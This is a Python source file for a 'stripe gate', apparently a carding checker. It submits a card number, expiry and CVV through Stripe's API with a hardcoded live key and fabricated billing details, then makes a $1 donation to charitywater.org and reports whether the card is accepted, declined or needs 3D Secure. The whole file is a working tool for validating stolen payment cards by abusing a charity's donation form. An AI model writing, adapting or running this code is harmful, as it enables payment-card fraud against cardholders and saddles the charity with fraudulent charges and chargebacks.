from httpx import AsyncClient
from utilsdf.functions import capture


async def stripe_gate(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        await session.get(
            "https://www.charitywater.org/",
        )

        post = f"type=card&billing_details[address][postal_code]=10027&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=118+W+132nd+St&billing_details[email]=sachiopremiun%40gmail.com&billing_details[name]=Sachio+YT&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=N/A&muid=N/A&sid=N/A&payment_user_agent=stripe.js%2Fecd86a62ca%3B+stripe-js-v3%2Fecd86a62ca%3B+card-element&time_on_page=40820&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"

        head = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
        }

        r2 = await session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=head,
            data=post,
        )
        pm = capture(r2.text, '"id": "', '"')

        post3 = f"country=us&payment_intent%5Bemail%5D=sachiopremiun%40gmail.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Banalytics_id%5D=e0b0fcd2-ceee-451b-adbf-e24becc208b0&payment_intent%5Bpayment_method%5D={pm}&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=sachiopremiun%40gmail.com&donation_form%5Bname%5D=Sachio&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=YT&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bprofile_campaign_id%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=118+W+132nd+St&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=New+York&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=10027&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22901813287%5D%5Bexperiment_id%5D=22901813287&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22901813287%5D%5Bexperiment_name%5D=Jan+2023+-+Homepage+Top+Bar+Spring+Page+Promo+Test&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22901813287%5D%5Bvariant_name%5D=Original&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22723142537%5D%5Bexperiment_id%5D=22723142537&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22723142537%5D%5Bexperiment_name%5D=Gift+language+patch+until+eng+implements&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_22723142537%5D%5Bvariant_name%5D=Original&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=%2B19006318646&donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Breferer%5D=&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false"

        head3 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://www.charitywater.org/",
        }

        r3 = await session.post(
            "https://www.charitywater.org/donate/stripe",
            headers=head3,
            data=post3,
        )
        r3_text = r3.text
        if "requiresAction" in r3_text:
            return "3D xD"
        msg = capture(r3_text, '"message":"', '"')
        # code = get_str(await r3_text, '"code":"', '"')
        if r3.status_code == 200 or r3.status_code == 302:
            return 200
        return msg
